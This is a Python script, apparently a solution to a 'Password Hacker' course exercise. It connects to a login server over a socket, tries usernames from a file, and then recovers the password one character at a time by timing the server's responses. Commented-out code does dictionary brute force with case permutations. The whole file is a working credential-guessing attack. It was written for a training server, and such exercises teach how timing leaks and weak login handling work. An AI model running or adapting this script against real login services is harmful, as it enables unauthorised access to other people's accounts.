import sys
import socket
import itertools
import string
import json
import  datetime


def tuple_to_string(tup):
    s = ''.join(tup)
    return s


def bruteforce(n):
    for i in range(1, n + 1):
        for word in itertools.product(string.ascii_lowercase + string.digits, repeat=i):
            yield tuple_to_string(word)


def dict_bruteforce(filename):
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            for s in itertools.product(*zip(line.lower(), line.upper())):
                yield tuple_to_string(s)


if __name__ == '__main__':
    args = sys.argv
    host = args[1]
    port = int(args[2])

    filepath = '/home/thetha-sigma/PycharmProjects/Password Hacker/Password Hacker/task/hacking/'

    with open(filepath + 'file.txt', 'w') as file_txt:
        with socket.socket() as client_socket:
            client_socket.connect((host, port))

            # for password in dict_bruteforce(filepath + 'passwords.txt'):
            #     client_socket.send(password.encode())
            #     response = client_socket.recv(1024)
            #     if response.decode() == 'Connection success!':
            #         print(password)
            #         break
            message = {'login': '', 'password': ' '}
            with open(filepath + 'logins.txt') as f:
                for login in f:
                    message['login'] = login.strip()
                    client_socket.send(json.dumps(message).encode())

                    start = datetime.datetime.now()
                    response = json.loads(client_socket.recv(1024).decode())
                    finish = datetime.datetime.now()
                    delta = finish - start

                    if response['result'] == 'Wrong password!':
                        break

                max_length = 10
                message['password'] = ''
                for i in range(max_length):
                    message['password'] += ' '
                    for letter in string.ascii_letters + string.digits:
                        message['password'] = message['password'][:-1]
                        message['password'] += letter

                        client_socket.send(json.dumps(message).encode())

                        start = datetime.datetime.now()
                        response = json.loads(client_socket.recv(1024).decode())
                        finish = datetime.datetime.now()

                        if (finish - start).total_seconds() > delta.total_seconds() * 10:
                            break
                        # if response['result'] == 'Exception happened during login':
                        #     break
                        elif response['result'] == 'Connection success!':
                            print(json.dumps(message))
                            exit()
